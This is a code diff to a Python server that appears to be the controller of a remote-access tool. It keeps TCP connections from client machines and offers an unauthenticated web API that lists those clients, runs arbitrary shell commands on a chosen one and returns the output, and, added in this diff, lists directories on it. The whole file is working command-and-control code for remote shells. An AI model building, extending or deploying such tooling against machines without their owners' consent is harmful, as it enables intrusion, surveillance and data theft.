@@ -7,7 +7,7 @@ import time
 
 socketHost = 'localhost'
 socketPort = 8088
-appsl = FastAPI()
+webapi = FastAPI()
 server = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM)
 socket_conns = {}
 
@@ -24,40 +24,56 @@ def listen_tcp():
 
 # region - WebAPI
 
-@appsl.get("/")
-def server_version():
-    return { 'Server-Version': '0.1' }
-
-
-@appsl.get("/list/")
-def list_connections():
-    conn_list = {}
-    #print(threading.enumerate())
-    for key in list(socket_conns.keys()):
-        conn_list[key] = str(socket_conns[key])
-    return conn_list
-
-
-@appsl.get("/shell/{conn_address}")
-def exec_shell(conn_address:str, command:str=None):
-    shell = socket_conns[conn_address]
-    shell.send(json.dumps({
-        'type': 'shell',
-        'content': command
+# Receive dynamic length socket data
+def recv_dyn_socket(client, type, content):
+    client.send(json.dumps({
+        'type': type,
+        'content': content
     }).encode())
     recv_length = 2048
     while True:
-        recv_data = shell.recv(recv_length).decode()
+        recv_data = client.recv(recv_length).decode()
         json_data = json.loads(recv_data)
         match json_data['type']:
             case 'length':
                 recv_length = json_data['content']
-                shell.send(json.dumps({
+                client.send(json.dumps({
                     'type': 'okay'
                 }).encode())
                 continue
             case 'data':
                 return json_data['content']
+
+
+@webapi.get("/") # Get server version
+def server_version():
+    return { 'Server-Version': '0.1' }
+
+
+@webapi.get("/list/") # Get client list
+def list_connections():
+    conn_list = dict()
+    for key in list(socket_conns.keys()):
+        conn_list[key] = str(socket_conns[key])
+    return conn_list
+
+
+@webapi.get("/shell/{conn_address}") # Execute shell in client
+def exec_shell(conn_address:str, command:str=None):
+    try:
+        client = socket_conns[conn_address]
+        return recv_dyn_socket(client, 'shell', command)
+    except:
+        return 'Undefind client'
+
+
+@webapi.get("/dir/{conn_address}") # List dir in client
+def scan_dir(conn_address:str, path:str=None):
+    try:
+        client = socket_conns[conn_address]
+        return recv_dyn_socket(client, 'scandir', path)
+    except:
+        return 'Undefind client'
 
 #endregion
 
@@ -81,7 +97,7 @@ def client_heartbeat():
 # region - Run service in thread
 
 def fastapi(): # fastapi service
-    uvicorn.run(appsl, host='0.0.0.0', port=8090)
+    uvicorn.run(webapi, host='0.0.0.0', port=8090)
 
 
 def tcplistener(): # socket tcp service
